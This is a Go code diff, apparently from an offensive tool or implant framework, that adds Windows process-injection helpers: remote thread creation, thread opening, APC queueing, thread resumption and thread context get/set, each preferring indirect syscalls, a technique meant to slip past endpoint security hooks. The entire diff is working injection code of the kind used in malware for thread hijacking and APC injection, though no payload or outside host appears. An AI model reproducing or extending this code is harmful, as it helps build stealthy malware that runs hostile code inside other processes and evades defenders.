@@ -16,6 +16,7 @@ import (
 
 var (
 	procReadProcessMemoryHelper = kernel32.NewProc("ReadProcessMemory")
+	procVirtualProtectX         = kernel32.NewProc("VirtualProtectEx")
 )
 
 // injectOpenProcess opens a process handle, using indirect syscalls when available.
@@ -170,4 +171,103 @@ func injectAllocWriteProtect(hProcess uintptr, data []byte, finalProtect uint32)
 		return 0, err
 	}
 	return addr, nil
+}
+
+// injectCreateRemoteThread creates a remote thread in a process, using indirect syscalls when available.
+func injectCreateRemoteThread(hProcess, startAddr uintptr) (uintptr, error) {
+	if IndirectSyscallsAvailable() {
+		var hThread uintptr
+		status := IndirectNtCreateThreadEx(&hThread, hProcess, startAddr)
+		if status != 0 {
+			return 0, fmt.Errorf("remote thread creation failed: NTSTATUS 0x%X", status)
+		}
+		return hThread, nil
+	}
+	hThread, _, err := procCreateRemoteThread.Call(hProcess, 0, 0, startAddr, 0, 0, 0)
+	if hThread == 0 {
+		return 0, fmt.Errorf("remote thread creation failed: %v", err)
+	}
+	return hThread, nil
+}
+
+// injectOpenThread opens a thread handle, using indirect syscalls when available.
+func injectOpenThread(desiredAccess uint32, tid uint32) (uintptr, error) {
+	if IndirectSyscallsAvailable() {
+		var handle uintptr
+		status := IndirectNtOpenThread(&handle, desiredAccess, uintptr(tid))
+		if status != 0 {
+			return 0, fmt.Errorf("NtOpenThread failed: NTSTATUS 0x%X", status)
+		}
+		return handle, nil
+	}
+	h, _, err := procOpenThread.Call(uintptr(desiredAccess), 0, uintptr(tid))
+	if h == 0 {
+		return 0, fmt.Errorf("OpenThread failed: %v", err)
+	}
+	return h, nil
+}
+
+// injectQueueAPC queues a user APC to a thread, using indirect syscalls when available.
+func injectQueueAPC(hThread, funcAddr uintptr) error {
+	if IndirectSyscallsAvailable() {
+		status := IndirectNtQueueApcThread(hThread, funcAddr, 0, 0, 0)
+		if status != 0 {
+			return fmt.Errorf("APC queue failed: NTSTATUS 0x%X", status)
+		}
+		return nil
+	}
+	ret, _, err := procQueueUserAPC.Call(funcAddr, hThread, 0)
+	if ret == 0 {
+		return fmt.Errorf("APC queue failed: %v", err)
+	}
+	return nil
+}
+
+// injectResumeThread resumes a suspended thread, using indirect syscalls when available.
+func injectResumeThread(hThread uintptr) (uint32, error) {
+	if IndirectSyscallsAvailable() {
+		var prevCount uint32
+		status := IndirectNtResumeThread(hThread, &prevCount)
+		if status != 0 {
+			return 0, fmt.Errorf("thread resume failed: NTSTATUS 0x%X", status)
+		}
+		return prevCount, nil
+	}
+	prevCount, _, _ := procResumeThread.Call(hThread)
+	if int32(prevCount) == -1 {
+		return 0, fmt.Errorf("thread resume failed")
+	}
+	return uint32(prevCount), nil
+}
+
+// injectGetThreadContext gets a thread's context, using indirect syscalls when available.
+func injectGetThreadContext(hThread uintptr, ctx *CONTEXT_AMD64) error {
+	if IndirectSyscallsAvailable() {
+		status := IndirectNtGetContextThread(hThread, uintptr(unsafe.Pointer(ctx)))
+		if status != 0 {
+			return fmt.Errorf("NtGetContextThread failed: NTSTATUS 0x%X", status)
+		}
+		return nil
+	}
+	ret, _, err := procGetThreadContext.Call(hThread, uintptr(unsafe.Pointer(ctx)))
+	if ret == 0 {
+		return fmt.Errorf("GetThreadContext failed: %v", err)
+	}
+	return nil
+}
+
+// injectSetThreadContext sets a thread's context, using indirect syscalls when available.
+func injectSetThreadContext(hThread uintptr, ctx *CONTEXT_AMD64) error {
+	if IndirectSyscallsAvailable() {
+		status := IndirectNtSetContextThread(hThread, uintptr(unsafe.Pointer(ctx)))
+		if status != 0 {
+			return fmt.Errorf("NtSetContextThread failed: NTSTATUS 0x%X", status)
+		}
+		return nil
+	}
+	ret, _, err := procSetThreadContext.Call(hThread, uintptr(unsafe.Pointer(ctx)))
+	if ret == 0 {
+		return fmt.Errorf("SetThreadContext failed: %v", err)
+	}
+	return nil
 }
